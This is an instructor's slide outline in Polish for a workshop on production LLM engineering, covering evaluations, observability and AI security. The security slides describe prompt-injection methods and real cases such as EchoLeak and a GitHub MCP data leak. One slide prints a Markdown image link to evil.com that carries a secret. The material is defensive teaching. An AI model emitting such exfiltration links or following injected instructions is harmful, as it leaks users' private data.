# Konspekt slajdów i notatki dla prowadzącego: Produkcyjna inżynieria AI

**Format:** 2 sesje półdniowe po 3,5 godziny  
**Stos:** Python 3.11+, Langfuse (OpenTelemetry), Promptfoo + `pytest`, Microsoft Presidio, Garak  
**Odbiorcy:** Inżynierowie oprogramowania i AI budujący produkcyjne aplikacje oparte na LLM  
**Stan narzędzi i standardów na:** listopad 2026

---

## Dzień 1: Ewaluacje AI, obserwowalność i monitoring (3,5 godziny)

### Otwarcie i wprowadzenie (5 min, w ramach bloku części 1.1)
- **Slajd 1: Tytuł i rezultaty warsztatów**
  - *Wizualizacja:* Diagram dwudniowej ścieżki (`Dzień 1: Mierz i obserwuj` → `Dzień 2: Broń i zarządzaj`).
  - *Punkty:* Koniec ze sprawdzaniem promptów „na oko”; budujemy skalibrowane ewaluacje, pełny tracing i bramki regresji w CI.
  - *Notatka dla prowadzącego:* Zapytaj salę: *„Ilu z was zmieniło jedno zdanie w prompcie systemowym, rzuciło okiem na 3 odpowiedzi, wdrożyło to, a potem okazało się, że zepsuło to zupełnie inny proces?”* Wykorzystaj podniesione ręce, by pokazać, po co są te warsztaty.

---

### Część 1.1: Dlaczego tradycyjne testowanie zawodzi i podstawy ewaluacji (35 min wykładu + 35 min Lab 1)

- **Slajd 2: Dlaczego `assert output == expected` nie działa w AI**
  - *Punkty:*
    - Stochastyczne odpowiedzi: to samo wejście, różne poprawne sformułowania.
    - Nieograniczona przestrzeń wejść: użytkownicy wymyślają sformułowania, języki i przypadki brzegowe, których nie da się wyliczyć.
    - Ciche regresje: zmiany modelu u dostawcy (alias, który zaczyna wskazywać nowszy snapshot, wycofany model, z którego trzeba migrować), zmiany w chunkowaniu czy edycje promptów obniżają jakość bez rzucania wyjątków.
  - *Notatka dla prowadzącego:* Podkreśl, że **testy jednostkowe nadal mają znaczenie** — tylko nie do sprawdzania równoważności semantycznej. Zachowaj deterministyczne asercje dla schematów, sygnatur narzędzi i budżetów opóźnień/tokenów.

- **Slajd 3: Piramida ewaluacji AI**
  - *Wizualizacja:* 4-poziomowa piramida od dołu (szybko/tanio) do góry (wolno/drogo):
    1. **Deterministyczne testy w kodzie** (`pydantic`, schemat JSON, regex, typy argumentów narzędzi, limity kosztów/opóźnień)
    2. **Metryki wyszukiwania i referencyjne** (Recall@k, MRR, NDCG dla RAG)
    3. **LLM-as-a-Judge** (wierność semantyczna, ton, zgodność z politykami)
    4. **Ocena przez człowieka** (budowanie Golden Datasets i kalibracja sędziów)
  - *Notatka dla prowadzącego:* Częste nieporozumienie: „Potrzebujemy LLM-as-a-Judge do wszystkiego”. Zaprotestuj: jeśli regex lub walidator Pydantic wyłapie problem w 1 ms za 0 zł, nigdy nie płać LLM-owi za ocenę.

- **Slajd 4: Najpierw analiza błędów (open i axial coding)**
  - *Punkty:*
    - Nie wymyślaj metryk w próżni — najpierw przeczytaj 50–100 surowych trace'ów.
    - **Open coding:** Zapisuj swobodne notatki przy każdym złym trace'ie (np. *„wymyślony termin zwrotu”*, *„zignorowane negatywne ograniczenie”*).
    - **Axial coding:** Pogrupuj notatki w 4–8 konkretnych trybów awarii; uszereguj według `częstotliwość × dotkliwość`.
    - Przypisz każdemu najważniejszemu trybowi awarii jeden skoncentrowany ewaluator Pass/Fail z własną etykietą ludzką.
  - *Notatka dla prowadzącego:* Inżynierowie często chcą od razu sięgnąć po gotowe oceny „pomocności” w skali 1–5. Wyjaśnij, dlaczego ogólne oceny ukrywają konkretne błędy — binarne testy specyficzne dla domeny mówią, *co* trzeba naprawić.

- **Slajd 5: Budowanie Golden Dataset**
  - *Punkty:*
    - Zacznij od 30–100 wartościowych wierszy, a nie 10 000 syntetycznych.
    - Źródła: produkcyjne logi z ocenami „kciuk w dół”, eskalacje do supportu, taksonomia przypadków brzegowych, złośliwe przykłady startowe.
    - Stratyfikuj według intencji, trudności i poziomu ryzyka (FAQ o niskiej stawce vs. wywołania narzędzi modyfikujące stan).
    - Dodaj pytania, na które dokumenty nie odpowiadają: poprawną odpowiedzią jest wtedy odmowa.
    - Wersjonuj datasety w Git lub Langfuse razem z promptami; pseudonimizuj produkcyjne trace'y, zanim trafią do zbioru.
  - *Notatka dla prowadzącego:* Przypomnij uczestnikom, że Golden Dataset to żywy zestaw testów — każdy błąd produkcyjny powinien stać się nowym wierszem. Wiersze zbudowane z produkcyjnych trace'ów zawierają dane osobowe, więc zaplanuj, jak usunąć wiersze danej osoby, także z historii Gita.

- **Slajd 6: LLM-as-a-Judge: projektowanie i kalibracja**
  - *Punkty:*
    - Preferuj **binarne Pass/Fail** zamiast skal Likerta 1–5.
    - Wymuszaj **rozumowanie/krytykę przed werdyktem** w ustrukturyzowanym wyjściu JSON.
    - Znane biasy: *position bias* (kolejność A/B), *verbosity bias* (dłuższe = lepsze), *self-preference*.
    - **Zasada kalibracji:** Zmierz precision/recall sędziego na zbiorze walidacyjnym oetykietowanym przez ludzi, zanim zaufasz mu w CI. Podawaj przedziały: 7 wyłapanych błędów z 8 to recall gdzieś między ok. 53% a ok. 98%.
  - *Notatka dla prowadzącego:* Podkreśl praktyczny trik: podczas kalibracji użyj jako sędziego silniejszego modelu lub modelu z innej rodziny niż generator, a dopiero potem przejdź na szybszego sędziego — tylko jeśli zgodność się utrzymuje. Zanim porównasz sędziego z ludźmi, sprawdź, czy ludzie zgadzają się ze sobą.

- **Slajd 7: Odprawa przed Labem 1 — analiza błędów i skalibrowany sędzia (35 min)**
  - *Punkty:*
    - Przeczytaj 20 trace'ów dev i znajdź główne tryby awarii (open → axial coding), zanim spojrzysz na etykiety.
    - Przeczytaj deterministyczne sprawdzenia formatu/cytowań.
    - Uruchom punkt odniesienia 1–5, potem napisz binarnego sędziego wierności i iteruj na dev.
    - Zmierz raz na 20 trace'ach val: precision/recall względem etykiety faithfulness, z przedziałami i kappą.
  - *Notatka dla prowadzącego:*
    - Około 15. minuty przejdź po sali i sprawdź, czy zespoły nie piszą mglistych promptów sędziego w stylu *„Oceń w skali 1–5, czy to jest dobre”*.
    - Na koniec przeznacz 5 minut na omówienie:
      - Jakie błędy popełniła skala 1–5? Szukaj poprawnych odmów ocenionych źle i płynnych zmyśleń ocenionych dobrze.
      - Czego binarny sędzia nadal nie łapie?
      - Jak szeroki jest przedział na val?
    - Nie obiecuj z góry konkretnej liczby: wyniki na żywo zależą od modelu i przebiegu. `--mock` działa bez klucza API, ale to prymitywna heurystyka, a nie cel.

---

### Przerwa (15 min)

---

### Część 1.2: Obserwowalność, monitoring i przegląd platform (35 min wykładu + 25 min Lab 2)

- **Slajd 8: Anatomia trace'a LLM**
  - *Wizualizacja:* Kaskada spanów: `request` → `query_rewrite` → `vector_search` → `rerank` → `llm_generate` → `tool_call` → `final_response`.
  - *Punkty:*
    - Wymagane atrybuty: `model`, `prompt_version`, `tokens_in/out/cached`, `TTFT`, `total_latency`, `cost_usd`, `retrieved_doc_ids`, `session_id`.
    - Dlaczego **OpenTelemetry (GenAI Semantic Conventions)** ma znaczenie: instrumentujesz raz, backend zmieniasz później. Przypnij wersję konwencji: nazwy atrybutów wciąż się zmieniają.
  - *Notatka dla prowadzącego:* Podkreśl konieczność `prompt_version` i `commit_sha` w każdym trace'ie. Bez tagów wersji nie da się zbisekcjonować skoku błędów po wdrożeniu.

- **Slajd 9: Monitoring online vs. ewaluacje offline**
  - *Punkty:*
    - **Kondycja systemu:** TTFT, opóźnienia P95/P99, zużycie tokenów na tenanta/funkcję, limity 429, uruchomienia fallbacków.
    - **Sygnały behawioralne:** Ponowne promptowanie, kopiowanie/porzucenie, feedback bezpośredni, odsetek pustych wyników wyszukiwania, błędy parsowania JSON.
    - **Wykrywanie dryfu:** Zmiany długości wejść, dryf tematów/embeddingów, nagłe skoki odmów po aktualizacjach u dostawcy.
    - **Higiena trace'ów:** Trace'y zawierają prompty, dokumenty i dane użytkowników: maskuj przed eksportem, ustaw retencję.
  - *Notatka dla prowadzącego:* Zapytaj: *„Ile macie alertów na HTTP 500, a ile na sytuację, w której LLM zwrócił poprawny JSON z kodem 200 OK o treści »nie mogę w tym pomóc«?”*

- **Slajd 10: Przegląd platform i macierz wyboru (listopad 2026)**
  - *Tabela/punkty:*
    - **Open source / do samodzielnego hostowania:** *Langfuse* (tracing + zarządzanie promptami + datasety + ewaluacje; od stycznia 2026 należy do ClickHouse, rdzeń nadal na MIT), *Arize Phoenix* (natywnie OTel, inspekcja embeddingów/RAG; Arize przejęty przez Dynatrace w 2026, Phoenix nadal open source), *Opik* (eksperymenty + tracing).
    - **Zarządzane / nastawione na ewaluację:** *Braintrust* (ścisła pętla od playgroundu do CI), *LangSmith* (natywny dla LangChain/LangGraph).
    - **Narzędzia CLI typu code-first:** *Promptfoo* (w marcu 2026 OpenAI ogłosiło jego przejęcie; pozostaje open source), *DeepEval*, *Ragas*, *Inspect AI* (szybkie uruchamianie lokalnie i w CI).
    - **Konsolidacja:** Helicone, lekkie proxy, które było wcześniej na tym slajdzie, w marcu 2026 trafiło do Mintlify i działa w trybie utrzymaniowym.
  - *Notatka dla prowadzącego:*
    - Uzasadnij wybór na warsztatach (**Langfuse + Promptfoo/pytest**): zespoły zyskują pełną kontrolę nad lokalizacją danych dzięki Langfuse oraz natywną dla Gita ergonomię CI dzięki Promptfoo/pytest.
    - Potem wyciągnij wniosek z 2026 roku: trzy narzędzia z tego slajdu zmieniły w tym roku właściciela. Dlatego laby emitują atrybuty OpenTelemetry i trzymają logikę bramki w `pytest`: to, co należy do ciebie, przetrwa dostawcę.
    - Powiedz wprost, że narzędzie do red teamingu, którego używamy w dniu 2, należy teraz do dostawcy modeli.

- **Slajd 11: Odprawa przed Labem 2 — tracing i diagnoza wąskich gardeł (25 min)**
  - *Punkty:*
    - Przeczytaj jeden trace i przebieg 10 żądań (P50/P95 dla każdego etapu).
    - Dodaj `prompt_version`, `retrieval_k`, `user_tier` i dołącz kciuk w górę od użytkownika później, po ID trace'a.
    - Napraw: równoległe narzędzia z osobnym spanem potomnym dla każdego, potem pobierz 20 → przerankuj → zostaw 4, obserwując `retrieval_hit`.
  - *Notatka dla prowadzącego:*
    - Podrzucone wąskie gardła to sekwencyjne wywołania narzędzi, zależność rozliczeniowa wolna przy co 10. żądaniu (widać to tylko w P95) i rozdęty kontekst `k=20`.
    - Jeśli ktoś zetnie `k` do 4, poproś o sprawdzenie `retrieval_hit`: odpowiedź jest na 7. miejscu.
    - Zakończ otwartym pytaniem z README: po poprawce P95 nadal wyznacza wolne wywołanie. Co by z nim zrobili?

---

### Część 1.3: Produkcyjne pętle ewaluacji i integracja z CI/CD (30 min wykładu + 30 min Lab 3)

- **Slajd 12: Ciągły flywheel ewaluacji**
  - *Wizualizacja:* Diagram pętli: `Ruch produkcyjny` → `Scorery online i feedback użytkowników` → `Triaż` → `Golden Dataset` → `Bramka CI/CD` → `Wdrożenie kanarkowe`.
  - *Punkty:* Błędy produkcyjne stają się stałymi testami regresyjnymi; CI zapobiega wypuszczeniu tego samego błędu dwa razy.
  - *Notatka dla prowadzącego:* Podkreśl odpowiedzialność: inżynierowie są właścicielami Golden Dataset tak samo jak testów jednostkowych — to nie jest „robota dla QA”.

- **Slajd 13: Bramki CI/CD bez rozsadzania budżetu**
  - *Punkty:*
    - **Bramka PR (<2 min):** Deterministyczne testy `pytest` + 25–50 wartościowych przypadków smoke w `promptfoo` z szybkim sędzią.
    - **Nocne / przed wydaniem:** Pełny Golden Dataset (500+ wierszy), symulacje wieloturowe i benchmarki przy zmianie modelu.
    - **Kontrola wariancji:** Stosuj porównania parami (`baseline` vs. `candidate` na identycznych wejściach) z przedziałami ufności, zamiast reagować na pojedynczy niestabilny wiersz. Dla niezawodności wymagaj `pass^k` (przypadek przechodzi we wszystkich k uruchomieniach, jak w τ-bench), a nie `pass@k`, które nagradza prompt działający tylko czasami.
    - **Bramki per wycinek:** Zbiorczy odsetek sukcesów potrafi ukryć wycinek, który spadł z 2/2 do 0/2.
  - *Notatka dla prowadzącego:* Odnieś się do zarzutu nr 1: *„Uruchamianie ewaluacji LLM w CI jest zbyt wolne i drogie”*. Pokaż, jak podział na PR i testy nocne utrzymuje feedback z PR poniżej 2 minut i kosztuje grosze za uruchomienie.

- **Slajd 14: Bezpieczne wdrożenia — shadow, canary i rollback**
  - *Punkty:*
    - **Tryb shadow:** Asynchroniczne odtwarzanie ruchu na żywo na nowym prompcie/modelu; ocena offline. Zastąp atrapą każdy efekt uboczny: agent w trybie shadow nigdy nie może wysłać e-maila.
    - **Canary (5% ruchu):** Automatyczny rollback przy błędach parsowania JSON, zadziałaniu guardrails lub regresji opóźnienia P95. Te sygnały nie widzą gorszych odpowiedzi, więc porównuj też oceny sędziego na próbkach ruchu kanarkowego i kontrolnego.
    - **Oddzielenie promptów od kodu:** Przechowuj wersjonowane prompty w Langfuse lub konfiguracji, aby awaryjny rollback nie wymagał przebudowy całego kontenera.
  - *Notatka dla prowadzącego:* Zakończ Dzień 1, łącząc obserwowalność z bezpieczeństwem: jutro zobaczymy, co się dzieje, gdy wejścia nie są po prostu zaszumione — są złośliwe.

- **Slajd 15: Odprawa przed Labem 3 — bramka regresji w CI (30 min)**
  - *Punkty:*
    - PR „tylko uprzejmiej formułuje odpowiedzi”: JSON i cytowania zostają, ale luki są uzupełniane wiedzą ogólną.
    - Uruchom bramkę: poprawność schematu 100%, ogólny próg spełniony, a mimo to porównanie parami w wycinkach nie przechodzi (`not_covered` 2/2 → 0/2).
    - Popraw kandydata.
  - *Notatka dla prowadzącego:*
    - Wyświetl na projektorze raport przypadków, które zmieniły wynik, aby wszyscy zobaczyli, jak recenzent PR czyta nieudaną ewaluację.
    - Zapytaj, dlaczego ogólny próg 90% przeszedł i co może udowodnić wycinek z 2 wierszy: jego przedział to 34–100% nawet przy 2/2.
    - Offline bramka odtwarza nagrane odpowiedzi przypisane do skrótu promptu i kończy się porażką dla edytowanego promptu. Poprawiony prompt wymaga `LIVE_EVAL=1` albo poprawki wzorcowej.

---

## Dzień 2: Bezpieczeństwo AI (3,5 godziny)

### Otwarcie i podsumowanie Dnia 1 (5 min, w ramach bloku części 2.1)
- **Slajd 16: Wprowadzenie do Dnia 2 — od niezawodności do odporności na ataki**
  - *Punkty:* Dzień 1 wyłapywał przypadkowe regresje; Dzień 2 to obrona przed celowymi atakami, wyciekami danych i niebezpiecznymi działaniami agentów.
  - *Notatka dla prowadzącego:* Połącz oba dni: każda luka bezpieczeństwa odkryta dzisiaj staje się nowym testem regresyjnym, w Labie 6 jako odtworzenie ataku na całym systemie.

---

### Część 2.1: Zrozumienie powierzchni ataku AI (20 min wykładu + 20 min Lab 4)

- **Slajd 17: Przyczyna źródłowa — zlewanie się danych i instrukcji**
  - *Punkty:*
    - LLM przetwarzają prompty systemowe, wejście użytkownika, chunki RAG i wyniki narzędzi w **jednym wspólnym strumieniu tokenów**.
    - Brak sprzętowo wymuszonych pierścieni uprawnień (w przeciwieństwie do sparametryzowanych zapytań SQL czy podziału jądro/przestrzeń użytkownika w OS).
    - Każdy niezaufany tekst trafiający do okna kontekstu to potencjalne przejęcie warstwy sterowania.
  - *Notatka dla prowadzącego:* Użyj analogii do SQL injection: przed sparametryzowanymi zapytaniami sklejanie stringów mieszało kod z danymi. W LLM *wszystko* w oknie kontekstu nadal jest sklejonym tekstem — dlatego obrona musi działać na granicach architektury i narzędzi.

- **Slajd 18: 5 granic zaufania (OWASP LLM Top 10 2026 + Agentic Top 10 2026)**
  - *Punkty:*
    1. **Granica wejścia:** Bezpośredni prompt injection, jailbreaki, przemycanie przez kodowanie.
    2. **Granica wyszukiwania / RAG:** Pośredni injection, zatruwanie korpusu, wycieki ACL między tenantami.
    3. **Granica narzędzi / agentowa:** Nadmierna autonomia, SSRF/SQLi przez argumenty generowane przez LLM, działania typu confused deputy (wspólny token konta serwisowego zamiast delegowanego tokenu użytkownika).
    4. **Granica wyjścia:** Wstrzykiwanie Markdown/XSS, niebezpieczna obsługa wyjścia, slopsquatting.
    5. **Dane i łańcuch dostaw:** Wycieki przez logi, luki w ZDR, złośliwe serwery MCP/pluginy (tool poisoning w opisach narzędzi, rug pull po zatwierdzeniu, token passthrough).
  - *Notatka dla prowadzącego:*
    - Trzymaj OWASP w wymiarze praktycznym — powiąż każdą granicę z konkretnym błędem, który inżynierowie znają z bezpieczeństwa webu/backendu.
    - Powiedz, której edycji używasz. Lista z 2026 roku (opublikowana 4 sierpnia 2026) znów zmieniła numerację: kategoria Excessive Agency przesunęła się na LLM03, Improper Output Handling spadła na LLM10, a System Prompt Leakage rozszerzono do LLM08 Hidden Context Exposure. Starsze materiały mapują się inaczej.
    - Dla agentów dodaj OWASP Top 10 for Agentic Applications (grudzień 2025, ASI01–ASI10), np. ASI01 Agent Goal Hijack, ASI02 Tool Misuse, ASI03 Identity & Privilege Abuse.

- **Slajd 19: Dwa modele myślowe — „zabójcza triada” i Agents Rule of Two**
  - *Wizualizacja:* Po lewej trójkąt triady: `(1) Dostęp do prywatnych danych` + `(2) Ekspozycja na niezaufane treści` + `(3) Komunikacja zewnętrzna`. Po prawej Rule of Two: `[A] niezaufane wejście`, `[B] wrażliwe systemy lub prywatne dane`, `[C] zmiana stanu lub komunikacja na zewnątrz`, z napisem „wybierz najwyżej dwie”.
  - *Punkty:*
    - **Triada (Simon Willison, 2025), dla poufności:** wszystkie trzy razem = cicha eksfiltracja danych. Przerwij jedną nogę, zwykle kanał wyjścia (żadnych dowolnych URL-i/obrazków, allowlista ruchu wychodzącego).
    - **Rule of Two (Meta, październik 2025), dla każdej szkodliwej akcji:** w jednej sesji najwyżej dwie z [A], [B], [C]. Jeśli zadanie wymaga wszystkich trzech, agent nie może działać autonomicznie: potrzebne jest zatwierdzenie przez człowieka albo inne wiarygodne sprawdzenie, ewentualnie nowa sesja.
    - Triada nie wyłapie wstrzykniętego `delete_workspace`: nie potrzebuje on prywatnych danych, tylko niezaufanego wejścia i możliwości zmiany wrażliwego systemu.
  - *Notatka dla prowadzącego:*
    - Używaj triady do pytania „czy dane mogą wyjść?”, a Rule of Two do pytania „czy może się stać coś szkodliwego?”. Wracaj do obu za każdym razem, gdy ktoś proponuje dać autonomicznemu agentowi narzędzia do zapisu w e-mailu/Slacku/HTTP.
    - Przykład: w maju 2025 Invariant Labs pokazało, jak złośliwe zgłoszenie w publicznym repozytorium GitHub skłoniło agenta z serwerem GitHub MCP do wycieku danych z prywatnego repozytorium do publicznego pull requesta.

- **Slajd 20: Odprawa przed Labem 4 — modelowanie zagrożeń aplikacji agentowej (20 min)**
  - *Punkty:*
    - Pracuj na diagramie architektury: bot na Slacku ze Slack Connect, RAG na Confluence, narzędzia zapisu do Jiry/e-maila, wspólny token konta serwisowego, obserwowalność w modelu SaaS.
    - Zmapuj źródła, aktywa i ujścia.
    - Udokumentuj 3 konkretne ścieżki ataku uszeregowane według `wpływ × prawdopodobieństwo`. Przypisz każdą do OWASP LLM 2026 i Agentic 2026, z mitygacją niezależną od modelu.
  - *Notatka dla prowadzącego:* Połącz inżynierów w pary na 12 minut, a następnie przez 8 minut zbierz najważniejsze ścieżki ataku na tablicy. Jeśli nikt nie znajdzie confused deputy, odbiorców w całym kanale ani danych HR w trace'ach, zadaj pytania o tożsamość, odbiorców i logi z arkusza.

---

### Część 2.2: Ataki, halucynacje oraz prywatność danych / ochrona PII (35 min wykładu + 40 min Lab 5)

- **Slajd 21: Wzorce prompt injection i eksfiltracji przez wyjście**
  - *Punkty:*
    - **Bezpośrednie:** Odgrywanie persony, wychodzenie poza delimitery, Base64/homoglify, wieloturowe crescendo.
    - **Pośrednie:** Ukryty tekst w HTML/PDF-ach, zatrute zgłoszenia w supporcie, złośliwe odpowiedzi narzędzi.
    - **Wydobywanie promptu systemowego:** Nigdy nie przechowuj kluczy API, connection stringów do baz ani tajnych reguł biznesowych w promptach systemowych.
    - **Bezkliknięciowa eksfiltracja:** LLM renderuje `![x](https://evil.com/leak?data=SECRET)` w interfejsie obsługującym Markdown. Link wymaga jednego kliknięcia; w Slacku unfurling pobiera go bez żadnego.
  - *Notatka dla prowadzącego:* Zrób demo na żywo lub pokaż konkretny przykład eksfiltracji przez obrazek w Markdown — inżynierowie niezmiennie są zaskoczeni, że chatbot tylko do odczytu może wyprowadzić dane przez wyrenderowany tag obrazka. Przykład z życia: EchoLeak (CVE-2025-32711, ujawniony w czerwcu 2025): jeden spreparowany e-mail mógł skłonić Microsoft 365 Copilot do eksfiltracji danych bez żadnej interakcji użytkownika.

- **Slajd 22: Halucynacje jako ryzyko bezpieczeństwa i biznesowe**
  - *Punkty:*
    - **Slopsquatting:** Atakujący rejestrują często halucynowane nazwy pakietów w PyPI/npm.
    - **Nieautoryzowane zobowiązania:** Boty wymyślające rabaty, SLA lub warunki prawne.
    - **Mitygacje:** Ścisłe ugruntowanie w źródłach, weryfikacja cytowań, wyjścia ograniczone przez `enum`/schemat oraz deterministyczne sprawdzanie reguł biznesowych *poza* LLM.
  - *Notatka dla prowadzącego:* Utrwal zasadę: LLM nigdy nie może być ostatecznym autorytetem w sprawie cen, uprawnień czy kwalifikowalności. Przykład z życia: w sprawie Moffatt v. Air Canada (2024) linia lotnicza odpowiadała za politykę taryf żałobnych, którą wymyślił jej chatbot.

- **Slajd 23: Prywatność danych, PII i kontrola dostępu w RAG**
  - *Punkty:*
    - **Redakcja przed wywołaniem LLM (Microsoft Presidio):** Wykrywaj i maskuj PII/sekrety numerowanymi placeholderami (`<PERSON_1>`, `<EMAIL_ADDRESS_1>`) *przed* wywołaniem zewnętrznych API modeli. Przywracaj dane lokalnie, po sanityzacji wyjścia, i nigdy do URL-a: klient pobiera nawet URL-e z allowlisty.
    - **Higiena obserwowalności:** Usuwaj PII/tokeny przed wysłaniem spanów do Langfuse/OTel; ustaw okresy retencji (TTL).
    - **ACL w bazach wektorowych:** Egzekwuj uprawnienia tenanta/użytkownika jako obowiązkowe filtry metadanych *wewnątrz* zapytania wyszukującego — nigdy w prompcie systemowym. Tożsamość pochodzi ze zweryfikowanej sesji, nigdy z żądania ani od modelu.
    - **Kontrole po stronie dostawcy:** Zero Data Retention (ZDR), umowy wykluczające trenowanie na danych, endpointy regionalne.
  - *Notatka dla prowadzącego:*
    - Podkreśl zasadę ACL w RAG: *„Jeśli dokument jest już w prompcie, na kontrolę dostępu jest za późno”.*
    - Presidio to NER „na tyle, na ile się da”, więc zmierz jego recall na własnych danych. Ma rozpoznawacze dla innych krajów (np. polski PESEL), ale lab ładuje tylko angielskie.
    - Zgodnie z RODO dane osobowe w promptach, trace'ach i Golden Datasets wymagają podstawy prawnej i ścieżki usuwania (dodatek do samodzielnej nauki).

- **Slajd 24: Odprawa przed Labem 5 — atak i utwardzanie (40 min)**
  - *Punkty:*
    - *Część A (atak, 15 min):* Trzy scenariusze z sesjami po stronie serwera.
      - Stażystka wyciąga poufne dane płacowe HR.
      - Umowa innego klienta wycieka między tenantami.
      - Strona dostawcy naszpikowana słowami kluczowymi uruchamia eksfiltrację e-mailem oraz przez obrazek i link w Markdown.
    - *Część B (obrona, 25 min):*
      - Filtry tenanta i uprawnień oparte na principalu z sesji.
      - Redakcja PII przez Presidio z numerowanymi, odwracalnymi placeholderami.
      - Sprawdzenie roli i allowlista odbiorców w wrapperze narzędzia.
      - Usuwanie zewnętrznych obrazków i linków.
  - *Notatka dla prowadzącego:* Pilnuj, by Część A nie przekroczyła 15 minut, żeby wszyscy mieli dość czasu na wdrożenie zabezpieczeń w Części B. W omówieniu zwróć uwagę, że symulowany model wykonuje injection w obu wersjach. W przypadku kierowniczki HR, która może czytać dane płacowe i wysyłać e-maile, wyciek zatrzymuje dopiero allowlista odbiorców.

---

### Przerwa (15 min)

---

### Część 2.3: Guardrails, kontrole w czasie działania, red teaming i governance (25 min wykładu + 30 min Lab 6 + 20 min governance i podsumowania)

- **Slajd 25: Wielowarstwowe guardrails w czasie działania (defense-in-depth)**
  - *Wizualizacja:* 4-etapowy pipeline: `Kontrole wejścia` → `ACL wyszukiwania` → `Polityki narzędzi i HITL` → `Kontrole wyjścia`, z etykietą „sygnał” nad etapem wejścia i „granica” nad etapem narzędzi.
  - *Punkty:*
    - **Wejście:** Limity częstości/długości, allowlisty tematów i wykrywanie injection (heurystyki albo klasyfikatory, np. Llama Prompt Guard 2, Lakera Guard, Azure Prompt Shields). Llama Guard to klasyfikator bezpieczeństwa treści, a nie detektor injection.
    - **Wykrywanie to sygnał, a nie granica:** w pracy „The Attacker Moves Second” (2025) adaptacyjne ataki złamały 12 opublikowanych obron, przeważnie ze skutecznością powyżej 90%. Używaj detektorów do ograniczania szumu, kwarantanny treści i zasilania telemetrii.
    - **Wyszukiwanie:** Filtry ACL w zapytaniu; oznaczanie granic niezaufanej treści (spotlighting), które obniża skuteczność statycznych ataków, ale nie adaptacyjnych.
    - **Wykonywanie narzędzi (granica):**
      - Autoryzacja na poziomie obiektu przy każdym wywołaniu, z delegowanym tokenem użytkownika o minimalnych uprawnieniach.
      - Ścisła walidacja argumentów przez Pydantic i allowlisty ruchu wychodzącego.
      - **Człowiek w pętli (HITL)** dla zapisów destrukcyjnych/zewnętrznych, po autoryzacji: HITL to nie autoryzacja, a zmęczenie zatwierdzaniem robi z niego pieczątkę.
    - **Wyjście:** Skanowanie pod kątem wycieku PII, kontrola toksyczności/polityk, kontrola ugruntowania.
    - **Budżet opóźnień:** Szybkie kontrole deterministyczne/małymi modelami uruchamiaj synchronicznie; ciężkie — asynchronicznie lub tylko dla akcji wysokiego ryzyka.
  - *Notatka dla prowadzącego:* Ostrzeż przed układaniem 5 synchronicznych wywołań LLM jako guardrails jedno po drugim — użytkownicy porzucą chatbota, który odpowiada 12 sekund. Potem zapytaj: *„Jeśli wasz klasyfikator injection przepuszcza jedno żądanie na sto, co to jedno żądanie może zrobić?”* O odpowiedzi powinna decydować polityka narzędzi, a nie klasyfikator.

- **Slajd 26: Automatyczny red teaming (`garak` i `promptfoo redteam`)**
  - *Punkty:*
    - Traktuj red teaming AI jak zautomatyzowany fuzzing + pentesty.
    - Kategorie ataków: jailbreaki, wydobywanie PII, pośredni injection, nadmierna autonomia, dostęp do obiektów innych tenantów, manipulacja poza tematem/wizerunkiem marki.
    - **Czytaj wyniki jak ewaluację:**
      - Generuj ataki z wyprzedzeniem, żeby przebiegi dało się porównać.
      - Grader to sędzia LLM: skalibruj go (przykłady dla gradera) i przeczytaj każdą porażkę.
      - Pięć prób na plugin to poszukiwanie, a nie pomiar: 0/5 nadal dopuszcza odsetek porażek ok. 43%.
    - **Zamknij pętlę:** Każdy potwierdzony exploit staje się stałym testem w CI, który odtwarza atak na prawdziwym systemie z oskryptowanymi odpowiedziami modelu. Test jednostkowy jednej funkcji guardraila nie wystarczy.
  - *Notatka dla prowadzącego:* Pokaż, że `garak` sonduje szeroko słabości modelu (nie przechodzi przez twoje guardrails), a `promptfoo redteam` sprawdza się najlepiej w zestawach adwersaryjnych specyficznych dla aplikacji i zintegrowanych z CI. Wspomnij, że w marcu 2026 OpenAI ogłosiło przejęcie Promptfoo: wiedz, do kogo należy narzędzie, które ocenia model twojego dostawcy.

- **Slajd 27: Odprawa przed Labem 6 — guardrails i red teaming (30 min)**
  - *Punkty:*
    - *Część A (10 min):* Zamień dwa znaleziska w padające testy replay: pośredni injection ze wspólnego centrum pomocy przy zmęczeniu zatwierdzaniem oraz fakturę innej organizacji.
    - *Część B (10 min):* Domknij `check_tool_policy` autoryzacją na poziomie obiektu i allowlistą odbiorców dla każdej organizacji.
    - *Część C (10 min):* Uruchom wcześniej wygenerowane ataki `promptfoo redteam` na wersji startowej i na rozwiązaniu, a werdykty gradera porównaj z logiem narzędzi.
  - *Notatka dla prowadzącego:*
    - Wygeneruj `redteam.yaml` kilka dni przed warsztatami i przeczytaj ataki. Jeśli uczestnicy nie mają klucza API, poprowadź Część C na projektorze.
    - W omówieniu pokaż polską parafrazę, która przechodzi przez tripwire znający tylko angielski.
    - Potem pokaż granicę rozwiązania: z `REDTEAM_HITL_APPROVED=1` wstrzyknięte `rotate_all_keys` od administratora nadal by się wykonało. Niezaufane wejście plus zmiana stanu to dokładnie przypadek, o którym mówi Rule of Two.

- **Slajd 28: Governance i gotowość produkcyjna**
  - *Punkty:*
    - **Inwentaryzacja i przepływ danych:** Udokumentuj modele, status ZDR, klasyfikację danych oraz zewnętrzne serwery MCP/narzędzia (przypięte definicje narzędzi).
    - **Reagowanie na incydenty:** Kill switche dla narzędzi oparte na feature flagach, natychmiastowy rollback promptu, fallback na innego dostawcę i bezpieczne odpowiedzi w trybie degradacji.
    - **EU AI Act po Digital Omnibus** (rozporządzenie (UE) 2026/1744, obowiązuje od 27 lipca 2026):
      - Przejrzystość z art. 50 obowiązuje od 2 sierpnia 2026. Własny bot zwykle czyni cię jego dostawcą: ujawnij interakcję z AI, oznaczaj treści syntetyczne.
      - Obowiązki dla systemów wysokiego ryzyka przesunięto na 2 grudnia 2027 (załącznik III) i 2 sierpnia 2028 (załącznik I).
      - Art. 4 wymaga działań wspierających kompetencje w zakresie AI.
    - **RODO i audyt:** DPIA tam, gdzie ryzyko jest wysokie, retencja i ścieżka usuwania danych z trace'ów i danych ewaluacyjnych, niezmienialne logi wywołań narzędzi przez agentów, NIST AI RMF / ISO/IEC 42001.
  - *Notatka dla prowadzącego:*
    - Zapytaj zespoły: *„Jeśli o 2 w nocy wasz agent zacznie wysyłać złe e-maile, ile sekund zajmie wam wyłączenie tego narzędzia bez ponownego wdrożenia?”*
    - W końcowym podsumowaniu omów **Checklistę gotowości produkcyjnej** z [curriculum-pl.md](./curriculum-pl.md) i poproś każdą osobę uczestniczącą o wskazanie jednej luki w obecnym systemie produkcyjnym, którą naprawi jako pierwszą.
